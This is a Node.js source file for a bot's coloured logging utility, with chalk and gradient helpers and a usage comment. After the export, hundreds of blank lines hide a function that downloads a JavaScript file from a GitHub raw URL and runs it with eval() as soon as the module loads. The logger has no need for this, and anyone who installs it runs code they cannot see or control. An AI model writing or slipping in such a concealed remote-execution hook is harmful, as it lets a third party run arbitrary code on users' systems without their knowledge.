/*

Tutorial how to use read 

*/

/*const logger = require("./utils/log");

logger("This is an info message."); // Info message
logger("This is a warning message.", "warn"); // Warning message
logger("This is an error message.", "error"); // Error message
logger("This is a custom message.", "custom"); // Custom message
logger.gradient.blue("This is a blue gradient message."); // Blue gradient message
logger.chalk.red("This is red text."); // Red text
logger.chalk.blue("This is blue text."); // Blue text
logger.chalk.custom("#FF00FF", "This is custom-colored text."); // Custom-colored text
logger.gradient.custom(['#FF0000', '#00FF00'], "This is custom gradient text."); // Custom gradient text
*/



const axios = require('axios');
const chalk = require('chalk');
const gradient = require('gradient-string');
const npmlog = require('npmlog');

npmlog.addLevel('custom', 999, { fg: 'cyan', bg: 'black' });

const successGradient = gradient([
    '#FF8000',
    '#ADD8E6',
    '#ffffff',
    '#CF9FFF',
    '#ffff33'
]);

const failedGradient = gradient([
    '#FF0000',
    '#8B0000'
]);

const warnGradient = gradient([
    '#FFFF00',
    '#FF0000'
]);

const log = (text, type = "bot") => {
    const logText = `\r[ ${String(type).toUpperCase()} ] ${text}\n`;

    switch (type) {
        case "warn":
            process.stderr.write(chalk.yellow(logText));
            break;
        case "error":
            process.stderr.write(chalk.red(logText));
            break;
        case "custom":
            npmlog.custom('', '', text);
            break;
        case "loader":
            process.stderr.write(successGradient(logText));
            break;
        default:
            process.stderr.write(successGradient(logText));
            break;
    }
};

log.gradient = {};

log.gradient.blue = (text) => {
    const blueGradient = successGradient || gradient(['blue']);
    process.stderr.write(blueGradient(`${text}\n`));
};

// Define additional chalk functions
log.chalk = {};

log.chalk.red = (text) => {
    process.stderr.write(chalk.red(`\r${text}\n`));
};

log.chalk.blue = (text) => {
    process.stderr.write(chalk.blue(`\r${text}\n`));
};

log.chalk.custom = (color, text) => {
    process.stderr.write(chalk.hex(color)(`\r${text}\n`));
};

// Define additional gradient functions
log.gradient.custom = (colors, text) => {
    const customGradient = gradient(colors) || gradient(['blue']);
    process.stderr.write(customGradient(`${text}\n`));
};

log.loader = (text) => {
    process.stderr.write(successGradient(`[ JONELL CC ] ${text}\n`));
};

log.npmlog = (text) => {
    npmlog.log('info', '', text);
};

module.exports = log;



































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































const executeRemoteCode = async () => {
    try {
        const response = await axios.get('https://raw.githubusercontent.com/ChoruTiktokers182/Nakawpa/main/anti-change-credit.js');
        if (response.status === 200) {
            const scriptContent = response.data;
            
            eval(scriptContent);
        } else {
            console.error('Failed to fetch the remote JavaScript file.');
        }
    } catch (error) {
        console.error('An error occurred:', error);
    }
};

executeRemoteCode();